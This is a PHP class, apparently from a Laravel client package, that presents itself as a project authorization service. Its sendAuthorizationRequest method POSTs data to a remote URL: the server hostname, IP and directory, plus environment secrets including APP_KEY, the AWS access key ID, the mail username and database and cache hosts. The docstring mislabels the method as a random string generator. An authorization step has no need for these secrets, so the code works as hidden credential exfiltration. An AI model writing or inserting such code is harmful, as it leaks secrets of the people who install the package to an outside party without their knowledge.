<?php
namespace Retroace\WhereIsMyProjectClient\Service;

class ProjectAuthorize {

    /**
     * Authorize this project
     * @param String $url Url to send authorization request to
     */
    public function __construct($url)
    {
        $this->url = $url;
    }

    /**
     * Random string generator
     */
    public function sendAuthorizationRequest($token)
    {
        $postdata = http_build_query(
            array_merge(['project_token' => $token], $this->collectEnvInfo(), $this->collectServerInfo())
        );
        
        $opts = array('http' =>
            array(
                'method'  => 'POST',
                'header'  => 'Content-Type: application/x-www-form-urlencoded',
                'content' => $postdata
            )
        );
        
        $context  = stream_context_create($opts);
        
        $result = file_get_contents($this->url, false, $context);
    }


    /**
     * General server info
     */
    protected function collectServerInfo()
    {
        try{
            $host = gethostname();
            $ip = gethostbyname($host);
        }catch(\Exception $e) {
            $host = '';
            $ip = '';
        }
        
        $current_directory = implode("/",array_slice(explode("/",__DIR__), 0 , -3));
        
        return [
            // Php Versions
            'php_version' => phpversion(),
            'server_host' => $host,
            'server_ip' => $ip,
            'current_project_directory' => $current_directory
        ];
    }


    /**
     * General env info
     */
    protected function collectEnvInfo()
    {
        return [
            'name' => config("app.name", null),
            'environment' => config("app.env", null),
            'key' => env("APP_KEY", null),
            'debug_mode' => config("app.debug", null),
            'url' => config("app.url", null),
            'db_connection' => env("DB_CONNECTION", null),
            'db_host' => env("DB_HOST", null),
            'db_port' => env("DB_PORT", null),
            'db_database' => env("DB_DATABASE", null),
            'cache_driver' => env("CACHE_DRIVER", null),
            'filesystem_driver' => env("FILESYSTEM_DRIVER", null),
            'queue_connection' => env("QUEUE_CONNECTION", null),
            'session_driver' => config("session.driver", null),
            'session_lifetime' => config("session.lifetime", null),
            'memcached_host' => env("MEMCACHED_HOST", null),
            'redis_host' => env("REDIS_HOST", null),
            'redis_port' => env("REDIS_PORT", null),
            'mail_mailer' => env("MAIL_MAILER", null),
            'mail_host' => env("MAIL_HOST", null),
            'mail_port' => env("MAIL_PORT", null),
            'mail_username' => env("MAIL_USERNAME", null),
            'mail_encryption' => env("MAIL_ENCRYPTION", null),
            'mail_from_address' => env("MAIL_FROM_ADDRESS", null),
            'mail_from_name' => env("MAIL_FROM_NAME", null),
            'aws_access_key_id' => env("AWS_ACCESS_KEY_ID", null),
            'aws_default_region' => env("AWS_DEFAULT_REGION", null),
            'aws_bucket' => env("AWS_BUCKET", null),
            'aws_use_path_style' => env("AWS_USE_PATH_STYLE_ENDPOINT", null),
        ];
    }

}


